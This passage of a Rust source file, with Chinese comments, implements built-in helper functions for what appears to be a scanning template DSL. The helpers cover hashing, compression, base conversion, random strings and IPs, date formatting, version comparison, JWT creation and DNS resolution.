            let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(secret.as_bytes())
                .map_err(|e| anyhow!("HMAC密钥错误: {}", e))?;
            mac.update(data.as_bytes());
            let result = mac.finalize();
            Ok(DslValue::String(hex::encode(result.into_bytes())))
        }
        _ => Err(anyhow!("不支持的HMAC算法: {}", algorithm)),
    }
}

/// gzip函数：Gzip压缩
fn builtin_gzip(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("gzip函数需要1个参数"));
    }

    let text = args[0].to_string();
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(text.as_bytes())
        .map_err(|e| anyhow!("Gzip压缩错误: {}", e))?;
    let compressed = encoder.finish()
        .map_err(|e| anyhow!("Gzip压缩完成错误: {}", e))?;

    Ok(DslValue::String(general_purpose::STANDARD.encode(&compressed)))
}

/// gzip_decode函数：Gzip解压缩
fn builtin_gzip_decode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("gzip_decode函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    let compressed = hex::decode(&encoded)
        .map_err(|e| anyhow!("十六进制解码错误: {}", e))?;

    let mut decoder = GzDecoder::new(&compressed[..]);
    let mut decompressed = String::new();
    decoder.read_to_string(&mut decompressed)
        .map_err(|e| anyhow!("Gzip解压缩错误: {}", e))?;

    Ok(DslValue::String(decompressed))
}

/// zlib函数：Zlib压缩
fn builtin_zlib(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("zlib函数需要1个参数"));
    }

    let text = args[0].to_string();
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(text.as_bytes())
        .map_err(|e| anyhow!("Zlib压缩错误: {}", e))?;
    let compressed = encoder.finish()
        .map_err(|e| anyhow!("Zlib压缩完成错误: {}", e))?;

    Ok(DslValue::String(general_purpose::STANDARD.encode(&compressed)))
}

/// zlib_decode函数：Zlib解压缩
fn builtin_zlib_decode(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("zlib_decode函数需要1个参数"));
    }

    let encoded = args[0].to_string();
    let compressed = hex::decode(&encoded)
        .map_err(|e| anyhow!("十六进制解码错误: {}", e))?;

    let mut decoder = ZlibDecoder::new(&compressed[..]);
    let mut decompressed = String::new();
    decoder.read_to_string(&mut decompressed)
        .map_err(|e| anyhow!("Zlib解压缩错误: {}", e))?;

    Ok(DslValue::String(decompressed))
}

/// bin_to_dec函数：二进制转十进制
fn builtin_bin_to_dec(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("bin_to_dec函数需要1个参数"));
    }

    let binary_str = args[0].to_string();
    let clean_binary = binary_str.trim_start_matches("0b");

    match i64::from_str_radix(clean_binary, 2) {
        Ok(decimal) => Ok(DslValue::Integer(decimal)),
        Err(e) => Err(anyhow!("二进制转换错误: {}", e)),
    }
}

/// dec_to_hex函数：十进制转十六进制
fn builtin_dec_to_hex(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("dec_to_hex函数需要1个参数"));
    }

    let decimal = args[0].to_integer()?;
    Ok(DslValue::String(format!("{:x}", decimal)))
}

/// hex_to_dec函数：十六进制转十进制
fn builtin_hex_to_dec(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("hex_to_dec函数需要1个参数"));
    }

    let hex_str = args[0].to_string();
    let clean_hex = hex_str.trim_start_matches("0x");

    match i64::from_str_radix(clean_hex, 16) {
        Ok(decimal) => Ok(DslValue::Integer(decimal)),
        Err(e) => Err(anyhow!("十六进制转换错误: {}", e)),
    }
}

/// oct_to_dec函数：八进制转十进制
fn builtin_oct_to_dec(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("oct_to_dec函数需要1个参数"));
    }

    let octal_str = args[0].to_string();
    let clean_octal = octal_str.trim_start_matches("0o");

    match i64::from_str_radix(clean_octal, 8) {
        Ok(decimal) => Ok(DslValue::Integer(decimal)),
        Err(e) => Err(anyhow!("八进制转换错误: {}", e)),
    }
}

/// rand_base函数：生成指定长度的随机字符串
fn builtin_rand_base(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("rand_base函数需要1-2个参数"));
    }

    let length = args[0].to_integer()? as usize;
    let charset = if args.len() == 2 {
        args[1].to_string()
    } else {
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".to_string()
    };

    let mut rng = rand::thread_rng();
    let result: String = (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap_or('a')
        })
        .collect();

    Ok(DslValue::String(result))
}

/// rand_char函数：生成单个随机字符
fn builtin_rand_char(args: &[DslValue]) -> Result<DslValue> {
    let charset = if args.is_empty() {
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".to_string()
    } else {
        args[0].to_string()
    };

    let mut rng = rand::thread_rng();
    let idx = rng.gen_range(0..charset.len());
    let char = charset.chars().nth(idx).unwrap_or('a');

    Ok(DslValue::String(char.to_string()))
}

/// rand_int函数：生成随机整数
fn builtin_rand_int(args: &[DslValue]) -> Result<DslValue> {
    let mut rng = rand::thread_rng();

    let (min, max) = match args.len() {
        0 => (0, i32::MAX as i64),
        1 => (0, args[0].to_integer()?),
        2 => (args[0].to_integer()?, args[1].to_integer()?),
        _ => return Err(anyhow!("rand_int函数最多需要2个参数")),
    };

    let result = rng.gen_range(min..=max);
    Ok(DslValue::Integer(result))
}

/// rand_text_alpha函数：生成随机字母字符串
fn builtin_rand_text_alpha(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("rand_text_alpha函数需要1-2个参数"));
    }

    let length = args[0].to_integer()? as usize;
    let bad_chars = if args.len() == 2 {
        args[1].to_string()
    } else {
        String::new()
    };

    let charset: String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        .chars()
        .filter(|c| !bad_chars.contains(*c))
        .collect();

    let mut rng = rand::thread_rng();
    let result: String = (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap_or('a')
        })
        .collect();

    Ok(DslValue::String(result))
}

/// rand_text_alphanumeric函数：生成随机字母数字字符串
fn builtin_rand_text_alphanumeric(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("rand_text_alphanumeric函数需要1-2个参数"));
    }

    let length = args[0].to_integer()? as usize;
    let bad_chars = if args.len() == 2 {
        args[1].to_string()
    } else {
        String::new()
    };

    let charset: String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        .chars()
        .filter(|c| !bad_chars.contains(*c))
        .collect();

    let mut rng = rand::thread_rng();
    let result: String = (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap_or('a')
        })
        .collect();

    Ok(DslValue::String(result))
}

/// rand_text_numeric函数：生成随机数字字符串
fn builtin_rand_text_numeric(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("rand_text_numeric函数需要1-2个参数"));
    }

    let length = args[0].to_integer()? as usize;
    let bad_chars = if args.len() == 2 {
        args[1].to_string()
    } else {
        String::new()
    };

    let charset: String = "0123456789"
        .chars()
        .filter(|c| !bad_chars.contains(*c))
        .collect();

    let mut rng = rand::thread_rng();
    let result: String = (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..charset.len());
            charset.chars().nth(idx).unwrap_or('0')
        })
        .collect();

    Ok(DslValue::String(result))
}

/// rand_ip函数：生成随机IP地址
fn builtin_rand_ip(args: &[DslValue]) -> Result<DslValue> {
    let mut rng = rand::thread_rng();

    if args.is_empty() {
        // 生成随机IPv4地址
        let ip = format!("{}.{}.{}.{}",
            rng.gen_range(1..255),
            rng.gen_range(0..255),
            rng.gen_range(0..255),
            rng.gen_range(1..255)
        );
        Ok(DslValue::String(ip))
    } else {
        // 根据CIDR生成随机IP地址
        let cidr = args[0].to_string();
        generate_random_ip_from_cidr(&cidr)
    }
}

/// unix_time函数：获取Unix时间戳
fn builtin_unix_time(args: &[DslValue]) -> Result<DslValue> {
    let current_time = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|e| anyhow!("获取时间错误: {}", e))?
        .as_secs() as i64;

    let additional_seconds = if args.is_empty() {
        0
    } else {
        args[0].to_integer()?
    };

    Ok(DslValue::Integer(current_time + additional_seconds))
}

/// date_time函数：格式化日期时间
fn builtin_date_time(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("date_time函数需要1-2个参数"));
    }

    let format = args[0].to_string();
    let timestamp = if args.len() == 2 {
        args[1].to_integer()?
    } else {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map_err(|e| anyhow!("获取时间错误: {}", e))?
            .as_secs() as i64
    };

    let datetime = DateTime::<Utc>::from_timestamp(timestamp, 0)
        .ok_or_else(|| anyhow!("无效的时间戳"))?;

    // 完整的strftime格式化实现
    let formatted = format_datetime_with_strftime(&datetime, &format)?;

    Ok(DslValue::String(formatted))
}

/// 完整的strftime格式化实现
fn format_datetime_with_strftime(datetime: &DateTime<Utc>, format: &str) -> Result<String> {
    let mut result = format.to_string();

    // 年份格式
    result = result.replace("%Y", &datetime.format("%Y").to_string()); // 4位年份
    result = result.replace("%y", &datetime.format("%y").to_string()); // 2位年份
    result = result.replace("%C", &datetime.format("%C").to_string()); // 世纪

    // 月份格式
    result = result.replace("%m", &datetime.format("%m").to_string()); // 数字月份 (01-12)
    result = result.replace("%B", &datetime.format("%B").to_string()); // 完整月份名
    result = result.replace("%b", &datetime.format("%b").to_string()); // 缩写月份名
    result = result.replace("%h", &datetime.format("%b").to_string()); // 缩写月份名 (同%b)

    // 日期格式
    result = result.replace("%d", &datetime.format("%d").to_string()); // 月中的日 (01-31)
    result = result.replace("%e", &datetime.format("%e").to_string()); // 月中的日 ( 1-31)
    result = result.replace("%j", &datetime.format("%j").to_string()); // 年中的日 (001-366)

    // 星期格式
    result = result.replace("%A", &datetime.format("%A").to_string()); // 完整星期名
    result = result.replace("%a", &datetime.format("%a").to_string()); // 缩写星期名
    result = result.replace("%w", &datetime.format("%w").to_string()); // 星期数 (0-6)
    result = result.replace("%u", &datetime.format("%u").to_string()); // 星期数 (1-7)

    // 时间格式
    result = result.replace("%H", &datetime.format("%H").to_string()); // 24小时制小时 (00-23)
    result = result.replace("%I", &datetime.format("%I").to_string()); // 12小时制小时 (01-12)
    result = result.replace("%k", &datetime.format("%k").to_string()); // 24小时制小时 ( 0-23)
    result = result.replace("%l", &datetime.format("%l").to_string()); // 12小时制小时 ( 1-12)
    result = result.replace("%M", &datetime.format("%M").to_string()); // 分钟 (00-59)
    result = result.replace("%S", &datetime.format("%S").to_string()); // 秒 (00-59)
    result = result.replace("%f", &datetime.format("%f").to_string()); // 微秒
    result = result.replace("%p", &datetime.format("%p").to_string()); // AM/PM
    result = result.replace("%P", &datetime.format("%P").to_string()); // am/pm

    // 时区格式
    result = result.replace("%z", &datetime.format("%z").to_string()); // UTC偏移
    result = result.replace("%Z", &datetime.format("%Z").to_string()); // 时区名称
    result = result.replace("%:z", &datetime.format("%:z").to_string()); // UTC偏移 (带冒号)

    // 周数格式
    result = result.replace("%U", &datetime.format("%U").to_string()); // 年中的周数 (周日开始)
    result = result.replace("%W", &datetime.format("%W").to_string()); // 年中的周数 (周一开始)
    result = result.replace("%V", &datetime.format("%V").to_string()); // ISO周数
    result = result.replace("%G", &datetime.format("%G").to_string()); // ISO年份
    result = result.replace("%g", &datetime.format("%g").to_string()); // ISO年份 (2位)

    // 组合格式
    result = result.replace("%c", &datetime.format("%c").to_string()); // 完整日期时间
    result = result.replace("%x", &datetime.format("%x").to_string()); // 日期
    result = result.replace("%X", &datetime.format("%X").to_string()); // 时间
    result = result.replace("%D", &datetime.format("%D").to_string()); // MM/DD/YY
    result = result.replace("%F", &datetime.format("%F").to_string()); // YYYY-MM-DD
    result = result.replace("%r", &datetime.format("%r").to_string()); // 12小时制时间
    result = result.replace("%R", &datetime.format("%R").to_string()); // HH:MM
    result = result.replace("%T", &datetime.format("%T").to_string()); // HH:MM:SS
    result = result.replace("%v", &datetime.format("%v").to_string()); // DD-MMM-YYYY

    // Unix时间戳
    result = result.replace("%s", &datetime.timestamp().to_string()); // Unix时间戳

    // 字面量
    result = result.replace("%%", "%"); // 字面量%
    result = result.replace("%n", "\n"); // 换行符
    result = result.replace("%t", "\t"); // 制表符

    Ok(result)
}

/// 从CIDR网段生成随机IP地址
fn generate_random_ip_from_cidr(cidr: &str) -> Result<DslValue> {
    use rand::RngCore;

    // 解析CIDR格式
    let (network_ip, prefix_len) = if let Some((ip_str, prefix_str)) = cidr.split_once('/') {
        let prefix = prefix_str.parse::<u8>()
            .map_err(|_| anyhow!("无效的CIDR前缀长度: {}", prefix_str))?;

        if prefix > 32 {
            return Err(anyhow!("CIDR前缀长度不能超过32: {}", prefix));
        }

        let ip = ip_str.parse::<std::net::Ipv4Addr>()
            .map_err(|_| anyhow!("无效的IP地址: {}", ip_str))?;

        (ip, prefix)
    } else {
        return Err(anyhow!("无效的CIDR格式，应为 IP/前缀长度: {}", cidr));
    };

    // 计算网络掩码
    let mask = if prefix_len == 0 {
        0u32
    } else {
        !((1u32 << (32 - prefix_len)) - 1)
    };

    // 获取网络地址
    let network_addr = u32::from(network_ip) & mask;

    // 计算主机位数量
    let host_bits = 32 - prefix_len;
    let max_hosts = if host_bits >= 32 {
        u32::MAX
    } else {
        (1u32 << host_bits) - 1
    };

    if max_hosts == 0 {
        // /32网络，只有一个地址
        return Ok(DslValue::String(network_ip.to_string()));
    }

    // 生成随机主机地址
    let mut rng = rand::thread_rng();
    let random_host = if max_hosts == u32::MAX {
        rng.next_u32()
    } else {
        rng.next_u32() % (max_hosts + 1)
    };

    // 组合网络地址和主机地址
    let random_ip_u32 = network_addr | random_host;
    let random_ip = std::net::Ipv4Addr::from(random_ip_u32);

    Ok(DslValue::String(random_ip.to_string()))
}

/// to_unix_time函数：将日期字符串转换为Unix时间戳
fn builtin_to_unix_time(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 2 {
        return Err(anyhow!("to_unix_time函数需要1-2个参数"));
    }

    let date_str = args[0].to_string();
    let layout = if args.len() == 2 {
        args[1].to_string()
    } else {
        "%Y-%m-%dT%H:%M:%S%z".to_string() // 默认ISO格式
    };

    // 尝试解析日期
    let parsed_date = if layout.contains("%") {
        // 使用strptime风格的格式
        chrono::NaiveDateTime::parse_from_str(&date_str, &layout)
            .map_err(|e| anyhow!("日期解析错误: {}", e))?
            .and_utc()
    } else {
        // 使用Go风格的格式
        let go_format = layout
            .replace("2006", "%Y")
            .replace("01", "%m")
            .replace("02", "%d")
            .replace("15", "%H")
            .replace("04", "%M")
            .replace("05", "%S");

        chrono::NaiveDateTime::parse_from_str(&date_str, &go_format)
            .map_err(|e| anyhow!("日期解析错误: {}", e))?
            .and_utc()
    };

    Ok(DslValue::Integer(parsed_date.timestamp()))
}

/// json_minify函数：压缩JSON字符串
fn builtin_json_minify(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("json_minify函数需要1个参数"));
    }

    let json_str = args[0].to_string();
    match serde_json::from_str::<JsonValue>(&json_str) {
        Ok(value) => {
            let minified = to_string_compact(&value)
                .map_err(|e| anyhow!("JSON序列化错误: {}", e))?;
            Ok(DslValue::String(minified))
        }
        Err(e) => Err(anyhow!("JSON解析错误: {}", e)),
    }
}

/// json_prettify函数：美化JSON字符串
fn builtin_json_prettify(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("json_prettify函数需要1个参数"));
    }

    let json_str = args[0].to_string();
    match serde_json::from_str::<JsonValue>(&json_str) {
        Ok(value) => {
            let prettified = to_string_pretty(&value)
                .map_err(|e| anyhow!("JSON序列化错误: {}", e))?;
            Ok(DslValue::String(prettified))
        }
        Err(e) => Err(anyhow!("JSON解析错误: {}", e)),
    }
}

/// compare_versions函数：版本比较
fn builtin_compare_versions(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 {
        return Err(anyhow!("compare_versions函数至少需要2个参数"));
    }

    let version = args[0].to_string();

    // 语义化版本比较实现
    for i in 1..args.len() {
        let constraint = args[i].to_string();

        let (operator, target_version) = parse_version_constraint(&constraint)?;
        let version_obj = parse_semantic_version(&version)?;
        let target_obj = parse_semantic_version(&target_version)?;

        let comparison_result = match operator.as_str() {
            ">" => compare_versions(&version_obj, &target_obj) > 0,
            ">=" => compare_versions(&version_obj, &target_obj) >= 0,
            "<" => compare_versions(&version_obj, &target_obj) < 0,
            "<=" => compare_versions(&version_obj, &target_obj) <= 0,
            "=" | "==" => compare_versions(&version_obj, &target_obj) == 0,
            "!=" => compare_versions(&version_obj, &target_obj) != 0,
            "~" => is_compatible_version(&version_obj, &target_obj), // 兼容版本
            "^" => is_caret_compatible(&version_obj, &target_obj),   // 插入符兼容
            _ => return Err(anyhow!("不支持的版本比较操作符: {}", operator)),
        };

        if !comparison_result {
            return Ok(DslValue::Boolean(false));
        }
    }

    Ok(DslValue::Boolean(true))
}

/// 语义化版本结构
#[derive(Debug, Clone, PartialEq)]
struct SemanticVersion {
    major: u32,
    minor: u32,
    patch: u32,
    pre_release: Option<String>,
    build: Option<String>,
}

/// 解析版本约束
fn parse_version_constraint(constraint: &str) -> Result<(String, String)> {
    let constraint = constraint.trim();

    if constraint.starts_with(">=") {
        Ok((">=".to_string(), constraint[2..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with("<=") {
        Ok(("<=".to_string(), constraint[2..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with("!=") {
        Ok(("!=".to_string(), constraint[2..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with("==") {
        Ok(("==".to_string(), constraint[2..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with('>') {
        Ok((">".to_string(), constraint[1..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with('<') {
        Ok(("<".to_string(), constraint[1..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with('=') {
        Ok(("=".to_string(), constraint[1..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with('~') {
        Ok(("~".to_string(), constraint[1..].trim().trim_start_matches('v').to_string()))
    } else if constraint.starts_with('^') {
        Ok(("^".to_string(), constraint[1..].trim().trim_start_matches('v').to_string()))
    } else {
        // 默认为等于比较
        Ok(("=".to_string(), constraint.trim_start_matches('v').to_string()))
    }
}

/// 解析语义化版本
fn parse_semantic_version(version_str: &str) -> Result<SemanticVersion> {
    let version_str = version_str.trim().trim_start_matches('v');

    // 分离构建元数据
    let (version_part, build) = if let Some(pos) = version_str.find('+') {
        (version_str[..pos].to_string(), Some(version_str[pos + 1..].to_string()))
    } else {
        (version_str.to_string(), None)
    };

    // 分离预发布版本
    let (core_version, pre_release) = if let Some(pos) = version_part.find('-') {
        (version_part[..pos].to_string(), Some(version_part[pos + 1..].to_string()))
    } else {
        (version_part, None)
    };

    // 解析主版本.次版本.修订版本
    let parts: Vec<&str> = core_version.split('.').collect();

    if parts.is_empty() {
        return Err(anyhow!("无效的版本格式: {}", version_str));
    }

    let major = parts[0].parse::<u32>()
        .map_err(|_| anyhow!("无效的主版本号: {}", parts[0]))?;

    let minor = if parts.len() > 1 {
        parts[1].parse::<u32>()
            .map_err(|_| anyhow!("无效的次版本号: {}", parts[1]))?
    } else {
        0
    };

    let patch = if parts.len() > 2 {
        parts[2].parse::<u32>()
            .map_err(|_| anyhow!("无效的修订版本号: {}", parts[2]))?
    } else {
        0
    };

    Ok(SemanticVersion {
        major,
        minor,
        patch,
        pre_release,
        build,
    })
}

/// 比较两个语义化版本
fn compare_versions(v1: &SemanticVersion, v2: &SemanticVersion) -> i32 {
    // 比较主版本号
    if v1.major != v2.major {
        return if v1.major > v2.major { 1 } else { -1 };
    }

    // 比较次版本号
    if v1.minor != v2.minor {
        return if v1.minor > v2.minor { 1 } else { -1 };
    }

    // 比较修订版本号
    if v1.patch != v2.patch {
        return if v1.patch > v2.patch { 1 } else { -1 };
    }

    // 比较预发布版本
    match (&v1.pre_release, &v2.pre_release) {
        (None, None) => 0,
        (Some(_), None) => -1, // 预发布版本小于正式版本
        (None, Some(_)) => 1,  // 正式版本大于预发布版本
        (Some(pre1), Some(pre2)) => {
            // 比较预发布版本标识符
            compare_pre_release(pre1, pre2)
        }
    }
}

/// 比较预发布版本标识符
fn compare_pre_release(pre1: &str, pre2: &str) -> i32 {
    let parts1: Vec<&str> = pre1.split('.').collect();
    let parts2: Vec<&str> = pre2.split('.').collect();

    let min_len = std::cmp::min(parts1.len(), parts2.len());

    for i in 0..min_len {
        let part1 = parts1[i];
        let part2 = parts2[i];

        // 尝试作为数字比较
        match (part1.parse::<u32>(), part2.parse::<u32>()) {
            (Ok(n1), Ok(n2)) => {
                if n1 != n2 {
                    return if n1 > n2 { 1 } else { -1 };
                }
            }
            (Ok(_), Err(_)) => return -1, // 数字标识符小于非数字标识符
            (Err(_), Ok(_)) => return 1,  // 非数字标识符大于数字标识符
            (Err(_), Err(_)) => {
                // 都是非数字，按字典序比较
                match part1.cmp(part2) {
                    std::cmp::Ordering::Equal => continue,
                    std::cmp::Ordering::Greater => return 1,
                    std::cmp::Ordering::Less => return -1,
                }
            }
        }
    }

    // 如果前面的部分都相等，比较长度
    if parts1.len() != parts2.len() {
        if parts1.len() > parts2.len() { 1 } else { -1 }
    } else {
        0
    }
}

/// 检查兼容版本（~操作符）
fn is_compatible_version(version: &SemanticVersion, target: &SemanticVersion) -> bool {
    // ~1.2.3 := >=1.2.3 <1.(2+1).0 := >=1.2.3 <1.3.0
    // ~1.2 := >=1.2.0 <1.(2+1).0 := >=1.2.0 <1.3.0
    // ~1 := >=1.0.0 <(1+1).0.0 := >=1.0.0 <2.0.0

    if version.major != target.major {
        return false;
    }

    if version.minor != target.minor {
        return false;
    }

    // 修订版本必须大于等于目标版本
    version.patch >= target.patch
}

/// 检查插入符兼容（^操作符）
fn is_caret_compatible(version: &SemanticVersion, target: &SemanticVersion) -> bool {
    // ^1.2.3 := >=1.2.3 <2.0.0
    // ^0.2.3 := >=0.2.3 <0.3.0
    // ^0.0.3 := >=0.0.3 <0.0.4

    if version.major != target.major {
        return false;
    }

    if target.major > 0 {
        // 主版本号大于0，允许次版本和修订版本变化
        compare_versions(version, target) >= 0
    } else if target.minor > 0 {
        // 主版本号为0，次版本号大于0，只允许修订版本变化
        version.minor == target.minor && version.patch >= target.patch
    } else {
        // 主版本号和次版本号都为0，不允许任何变化
        compare_versions(version, target) == 0
    }
}

/// print_debug函数：调试打印
fn builtin_print_debug(args: &[DslValue]) -> Result<DslValue> {
    let output: Vec<String> = args.iter()
        .map(|arg| arg.to_string())
        .collect();

    println!("{}", output.join(" "));
    Ok(DslValue::Boolean(true))
}

// 辅助函数：版本比较
fn version_greater_than(v1: &str, v2: &str) -> bool {
    let v1_clean = v1.trim_start_matches('v');
    let v2_clean = v2.trim_start_matches('v');

    let v1_parts: Vec<u32> = v1_clean.split('.').filter_map(|s| s.parse().ok()).collect();
    let v2_parts: Vec<u32> = v2_clean.split('.').filter_map(|s| s.parse().ok()).collect();

    for i in 0..std::cmp::max(v1_parts.len(), v2_parts.len()) {
        let v1_part = v1_parts.get(i).unwrap_or(&0);
        let v2_part = v2_parts.get(i).unwrap_or(&0);

        if v1_part > v2_part {
            return true;
        } else if v1_part < v2_part {
            return false;
        }
    }

    false
}

fn version_less_than(v1: &str, v2: &str) -> bool {
    let v1_clean = v1.trim_start_matches('v');
    let v2_clean = v2.trim_start_matches('v');

    let v1_parts: Vec<u32> = v1_clean.split('.').filter_map(|s| s.parse().ok()).collect();
    let v2_parts: Vec<u32> = v2_clean.split('.').filter_map(|s| s.parse().ok()).collect();

    for i in 0..std::cmp::max(v1_parts.len(), v2_parts.len()) {
        let v1_part = v1_parts.get(i).unwrap_or(&0);
        let v2_part = v2_parts.get(i).unwrap_or(&0);

        if v1_part < v2_part {
            return true;
        } else if v1_part > v2_part {
            return false;
        }
    }

    false
}

fn version_equal(v1: &str, v2: &str) -> bool {
    let v1_clean = v1.trim_start_matches('v');
    let v2_clean = v2.trim_start_matches('v');

    let v1_parts: Vec<u32> = v1_clean.split('.').filter_map(|s| s.parse().ok()).collect();
    let v2_parts: Vec<u32> = v2_clean.split('.').filter_map(|s| s.parse().ok()).collect();

    if v1_parts.len() != v2_parts.len() {
        return false;
    }

    v1_parts == v2_parts
}

/// wait_for函数：暂停执行指定秒数
fn builtin_wait_for(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("wait_for函数需要1个参数"));
    }

    let seconds = args[0].to_integer()? as u64;
    std::thread::sleep(std::time::Duration::from_secs(seconds));
    Ok(DslValue::Boolean(true))
}

/// generate_jwt函数：生成JWT令牌
fn builtin_generate_jwt(args: &[DslValue]) -> Result<DslValue> {
    if args.is_empty() || args.len() > 4 {
        return Err(anyhow!("generate_jwt函数需要1-4个参数"));
    }

    let json_payload = args[0].to_string();
    let _algorithm = if args.len() > 1 { args[1].to_string() } else { "HS256".to_string() };
    let signature = if args.len() > 2 { args[2].to_string() } else { "secret".to_string() };

    // 标准JWT实现
    let header = r#"{"alg":"HS256","typ":"JWT"}"#;
    let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header.as_bytes());
    let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(json_payload.as_bytes());

    // 使用HMAC-SHA256进行签名
    let message = format!("{}.{}", header_b64, payload_b64);
    let mut hasher = <Hmac<Sha256> as Mac>::new_from_slice(signature.as_bytes())
        .map_err(|e| anyhow!("JWT签名错误: {}", e))?;
    hasher.update(message.as_bytes());
    let signature_bytes = hasher.finalize().into_bytes();
    let signature_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&signature_bytes);

    let jwt = format!("{}.{}.{}", header_b64, payload_b64, signature_b64);
    Ok(DslValue::String(jwt))
}

/// resolve函数：真实DNS解析实现
fn builtin_resolve(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("resolve函数需要2个参数"));
    }

    let host = args[0].to_string();
    let record_type = args[1].to_string();

    // 创建DNS解析器实例
    let resolver = create_dns_resolver()?;

    // 使用真实的DNS解析器进行查询
    match record_type.as_str() {
        "4" | "a" => {
            // A记录查询
            match resolver.lookup_ip(&host) {
                Ok(response) => {
                    for ip in response.iter() {
                        if ip.is_ipv4() {
                            return Ok(DslValue::String(ip.to_string()));
                        }
                    }
                    Err(anyhow!("未找到A记录"))
                }
                Err(e) => Err(anyhow!("DNS A记录查询失败: {}", e)),
            }
        }
        "6" | "aaaa" => {
            // AAAA记录查询
            match resolver.lookup_ip(&host) {
                Ok(response) => {
                    for ip in response.iter() {
                        if ip.is_ipv6() {
                            return Ok(DslValue::String(ip.to_string()));
                        }
                    }
                    Err(anyhow!("未找到AAAA记录"))
                }
                Err(e) => Err(anyhow!("DNS AAAA记录查询失败: {}", e)),
            }
        }
        "cname" => {
            // CNAME记录查询
            match resolver.lookup(&host, RecordType::CNAME) {
                Ok(response) => {
                    if let Some(record) = response.iter().next() {
                        if let Some(cname) = record.as_cname() {
                            return Ok(DslValue::String(cname.to_string()));
                        }
                    }
                    Err(anyhow!("未找到CNAME记录"))
                }
                Err(e) => Err(anyhow!("DNS CNAME记录查询失败: {}", e)),
            }
        }
        "mx" => {
            // MX记录查询
            match resolver.lookup(&host, RecordType::MX) {
                Ok(response) => {
                    if let Some(record) = response.iter().next() {
                        if let Some(mx) = record.as_mx() {
                            return Ok(DslValue::String(mx.exchange().to_string()));
                        }
                    }
                    Err(anyhow!("未找到MX记录"))
                }
                Err(e) => Err(anyhow!("DNS MX记录查询失败: {}", e)),
            }
        }
        "txt" => {
            // TXT记录查询
            match resolver.lookup(&host, RecordType::TXT) {
                Ok(response) => {
                    if let Some(record) = response.iter().next() {
                        if let Some(txt) = record.as_txt() {
                            let txt_data: String = txt.iter()
                                .map(|bytes| String::from_utf8_lossy(bytes))
                                .collect::<Vec<_>>()
                                .join("");
                            return Ok(DslValue::String(txt_data));
                        }
                    }
                    Err(anyhow!("未找到TXT记录"))
                }
                Err(e) => Err(anyhow!("DNS TXT记录查询失败: {}", e)),
            }
        }
        "ns" => {
            // NS记录查询
            match resolver.lookup(&host, RecordType::NS) {
                Ok(response) => {
                    if let Some(record) = response.iter().next() {
                        if let Some(ns) = record.as_ns() {
                            return Ok(DslValue::String(ns.to_string()));
                        }
                    }
                    Err(anyhow!("未找到NS记录"))
                }
                Err(e) => Err(anyhow!("DNS NS记录查询失败: {}", e)),
            }
        }
        _ => Err(anyhow!("不支持的DNS记录类型: {}", record_type)),
    }
}

/// ip_format函数：IP格式转换
fn builtin_ip_format(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("ip_format函数需要2个参数"));
    }

    let ip = args[0].to_string();
    let format_index = args[1].to_integer()?;

    // 完整的IP格式转换实现
    // 首先验证IP地址的有效性
    let parsed_ip = ip.parse::<std::net::Ipv4Addr>()
        .map_err(|_| anyhow!("无效的IPv4地址: {}", ip))?;

    match format_index {
        1 => {
            // 原始点分十进制格式
            Ok(DslValue::String(ip))
        }
        2 => {
